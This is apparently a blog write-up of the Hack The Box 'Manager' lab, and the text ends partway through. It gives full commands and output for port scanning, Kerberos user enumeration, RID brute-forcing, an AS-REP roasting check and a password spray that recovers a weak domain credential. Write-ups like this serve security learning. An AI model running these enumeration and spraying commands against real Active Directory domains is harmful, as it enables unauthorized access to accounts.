<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
<title>HTB Manager Write-up | Jordan&#39;s Blog</title>
<meta name="title" content="HTB Manager Write-up" />
<meta name="description" content="A write-up for the Manager box." />
<meta name="keywords" content="HTB,Pentesting," />


<meta property="og:url" content="https://jordangalida.github.io/htb-manager-write-up/">
  <meta property="og:site_name" content="Jordan&#39;s Blog">
  <meta property="og:title" content="HTB Manager Write-up">
  <meta property="og:description" content="A write-up for the Manager box.">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2025-02-24T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-02-24T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Pentesting">
    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">




  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
  <meta name="twitter:title" content="HTB Manager Write-up">
  <meta name="twitter:description" content="A write-up for the Manager box.">




  <meta itemprop="name" content="HTB Manager Write-up">
  <meta itemprop="description" content="A write-up for the Manager box.">
  <meta itemprop="datePublished" content="2025-02-24T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-02-24T00:00:00+00:00">
  <meta itemprop="wordCount" content="3283">
  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
  <meta itemprop="keywords" content="HTB,Pentesting">
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  :root {
      --width: 800px;
      --font-main: "Courier New", monospace;
      --font-secondary: "Courier New", monospace;
      --font-scale: 1em;
      --background-color: #fff;
      --heading-color: #222;
      --text-color: #444;
      --link-color: #32ab60;
      --visited-color:  #32ab60;
      --code-background-color: #f2f2f2;
      --code-color: #222;
      --blockquote-color: #222;
      --overflow-wrap: break-word;
  }

  @media (prefers-color-scheme: dark) {
      :root {
          --background-color: #070b0a;
          --heading-color: #32ab60;
          --text-color: #32ab60;
          --link-color: #32ab60;
          --visited-color:  #32ab60;
          --code-background-color: #272822;
          --code-color: #ddd;
          --blockquote-color: #ccc;
      }
  }

  body {
      font-family: var(--font-secondary);
      font-size: var(--font-scale);
      margin: auto;
      padding: 20px;
      max-width: var(--width);
      text-align: left;
      background-color: var(--background-color);
      word-wrap: break-word;
      overflow-wrap: break-word;
      white-space: normal;
      line-height: 1.5;
      color: var(--text-color);
  }

  h1, h2, h3, h4, h5, h6 {
      font-family: var(--font-main);
      color: var(--heading-color);
  }

  a {
      color: var(--link-color);
      cursor: pointer;
      text-decoration: none;
  }

  a:hover {
      text-decoration: underline; 
  }

  nav a {
      margin-right: 8px;
  }

  strong, b {
      color: var(--heading-color);
  }

  button {
      margin: 0;
      cursor: pointer;
  }

  main {
      line-height: 1.6;
  }

  table {
      width: 100%;
  }

  hr {
      border: 0;
      border-top: 1px dashed;
  }

  img {
      max-width: 100%;
  }

  pre {
      white-space: pre-wrap !important;
      overflow-x: auto !important;
      word-break: break-all !important;
      max-width: var(--width) !important;
      margin: 0 !important;
  }

  code {
      font-family: "Courier New", monospace;
      background-color: var(--code-background-color);
      color: var(--code-color);
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow-wrap: anywhere;
  }

  blockquote {
      border-left: 1px solid #999;
      color: var(--code-color);
      padding-left: 20px;
      font-style: italic;
      text-wrap: wrap;
  }

  footer {
      padding: 25px 0;
      text-align: center;
  }

  .title:hover {
      text-decoration: none;
  }

  .title h1 {
      font-size: 1.5em;
  }

  .inline {
      width: auto !important;
  }

  .highlight, .code {
      background-color: var(--code-background-color);
      color: var(--code-color);
      padding: 5px 10px;
      word-break: normal;
      white-space: pre-wrap; 
      overflow-wrap: anywhere;
      overflow-x: auto;
  }

   
  ul.blog-posts {
      list-style-type: none;
      padding: unset;
  }

  ul.blog-posts li {
      display: flex;
  }

  ul.blog-posts li span {
      flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
      color: var(--visited-color);
</style>

</head>

<body>
  <header><a href="/" class="title">
  <h2>Jordan&#39;s Blog</h2>
</a>
<nav><a href="/">Home</a>


<a href="/blog">Blog</a>

</nav>
</header>
  <main>

<h1>HTB Manager Write-up</h1>
<p>
  <i>
    <time datetime='2025-02-24'>
      24 Feb, 2025
    </time>
  </i>
</p>

<content>
  <p>Starting out with our <code>nmap</code> scan on all ports, with scripts and version detection enabled</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.236 -oA Scans/manager_all
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 19:58 EST
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.236
</span></span><span style="display:flex;"><span>Host is up (0.019s latency).
</span></span><span style="display:flex;"><span>Not shown: 65513 filtered tcp ports (no-response)
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span>| http-methods:
</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span>|_http-title: Manager
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-07 08:01:31Z)
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-03-07T08:03:03+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-03-07T08:03:05+00:00; +6h59m59s from scanner time.
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-03-07T08:03:04+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ms-sql-info:
</span></span><span style="display:flex;"><span>|   10.10.11.236:1433:
</span></span><span style="display:flex;"><span>|     Version:
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server 2019 RTM
</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server 2019
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: 1433
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2025-03-07T07:50:07
</span></span><span style="display:flex;"><span>|_Not valid after:  2055-03-07T07:50:07
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
</span></span><span style="display:flex;"><span>|   10.10.11.236:1433:
</span></span><span style="display:flex;"><span>|     Target_Name: MANAGER
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: MANAGER
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC01
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: manager.htb
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc01.manager.htb
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: manager.htb
</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-03-07T08:03:04+00:00; +6h59m59s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-03-07T08:03:04+00:00; +7h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc01.manager.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-30T17:08:51
</span></span><span style="display:flex;"><span>|_Not valid after:  2122-07-27T10:31:04
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49690/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49691/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49724/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49791/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49832/tcp open  tcpwrapped
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2025-03-07T08:02:27
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3:1:1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span></code></pre></div><p>Lot&rsquo;s of open ports here. Looks like the domain is <code>manager.htb</code> and this is a domain controller. We will start with the lower ports and work our way down the list. First, let&rsquo;s see if we can find anything juicy with DNS</p>
<p>Poking around we find another subdomain <code>hostmaster.manager.htb</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$dig any manager.htb @10.10.11.236
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>; &lt;&lt;&gt;&gt; DiG 9.18.33-1~deb12u2-Debian &lt;&lt;&gt;&gt; any manager.htb @10.10.11.236
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>;; Got answer:
</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 15611
</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>;; OPT PSEUDOSECTION:
</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: 4000
</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
</span></span><span style="display:flex;"><span>;manager.htb.                   IN      ANY
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>;; ANSWER SECTION:
</span></span><span style="display:flex;"><span>manager.htb.            600     IN      A       10.10.11.236
</span></span><span style="display:flex;"><span>manager.htb.            3600    IN      NS      dc01.manager.htb.
</span></span><span style="display:flex;"><span>manager.htb.            3600    IN      SOA     dc01.manager.htb. hostmaster.manager.htb. 251 900 600 86400 3600
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>;; ADDITIONAL SECTION:
</span></span><span style="display:flex;"><span>dc01.manager.htb.       3600    IN      A       10.10.11.236
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>;; Query time: 19 msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.236#53(10.10.11.236) (TCP)
</span></span><span style="display:flex;"><span>;; WHEN: Thu Mar 06 20:10:43 EST 2025
</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: 138
</span></span></code></pre></div><p>Let&rsquo;s check out the website
<img src="/images/Manager/website.png" alt="Website"></p>
<p>There is a <code>Contact Us</code> page, which we could check for session hijacking if an admin is reading the messages
<img src="/images/Manager/xss.png" alt="Website"></p>
<p>But we don&rsquo;t receive any calls back. I don&rsquo;t see anything in the source code that references any known CMS. Let&rsquo;s check out that subdomain.</p>
<p>It looks exactly the same? Interesting. Ok, we can come back to it. Let&rsquo;s check Kerberos by running <code>Kerbrute</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$./kerbrute_linux_amd64 userenum -d manager.htb --dc 10.10.11.236 jsmith.txt
</span></span></code></pre></div><p>While that runs, let&rsquo;s check <code>smb</code>. Looks like just the normal shares</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.11.236/
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
</span></span><span style="display:flex;"><span>        ---------       ----      -------
</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>        C$              Disk      Default share
</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
</span></span><span style="display:flex;"><span>Reconnecting with SMB1 for workgroup listing.
</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
</span></span></code></pre></div><p><code>Kerbrute</code> finished and we didn&rsquo;t find any valid usernames. Note: if you use a different wordlist, you will get some valid names. Trying <code>rpcclient</code> didn&rsquo;t result in anything, but we can actually perform a RPC-cycling attack. This is a method of enumerating accounts through null sessions</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.236 -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [+] manager.htb\guest:
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
</span></span></code></pre></div><p>Checking if any users have <code>UF_DONT_REQUIRE_PREAUTH</code> set, but no luck</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$GetNPUsers.py MANAGER.HTB/ -dc-ip 10.10.11.236 -no-pass -usersfile valid_users.txt
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
</span></span><span style="display:flex;"><span>[-] User Zhong doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User Cheng doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User Ryan doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User Raven doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User JinWoo doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User ChinHae doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>[-] User Operator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></code></pre></div><p>After a ton of trial and error, finally we get a pair of credentials through a password spray by&hellip; Using the usernames as passwords. I didn&rsquo;t like this because it&rsquo;s one of those things where you can get stuck for a long time on something that is more of a guess</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.236 -u valid_users.txt -p pass.txt -d manager --no-bruteforce
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\Zhong:zhong STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\Cheng:cheng STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\Ryan:ryan STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\Raven:raven STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\JinWoo:jinwoo STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [-] manager\ChinHae:chinhae STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [+] manager\Operator:operator
</span></span></code></pre></div><p>Let&rsquo;s see if this user has access to any shares</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.236 -u <span style="color:#e6db74">&#39;Operator&#39;</span> -p <span style="color:#e6db74">&#39;operator&#39;</span> --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>The SYSVOL and NETLOGON shares can contain credentials, so let&rsquo;s look at those. We can use the <code>netexec spider_plus</code> module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$netexec smb 10.10.11.236 -u <span style="color:#e6db74">&#39;Operator&#39;</span> -p <span style="color:#e6db74">&#39;operator&#39;</span> -M spider_plus --share <span style="color:#e6db74">&#39;NETLOGON&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Started module spidering_plus with the following options:
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  DOWNLOAD_FLAG: False
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]     STATS_FLAG: True
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] EXCLUDE_FILTER: [&#39;print$&#39;, &#39;ipc$&#39;]
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]   EXCLUDE_EXTS: [&#39;ico&#39;, &#39;lnk&#39;]
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [+] Saved share-file metadata to &#34;/tmp/nxc_hosted/nxc_spider_plus/10.10.11.236.json&#34;.
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] SMB Filtered Shares:  1
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Total folders found:  19
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] Total files found:    5
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size average:    1.77 KB
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size min:        22 B
</span></span><span style="display:flex;"><span>SPIDER_PLUS 10.10.11.236    445    DC01             [*] File size max:        4.82 KB
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
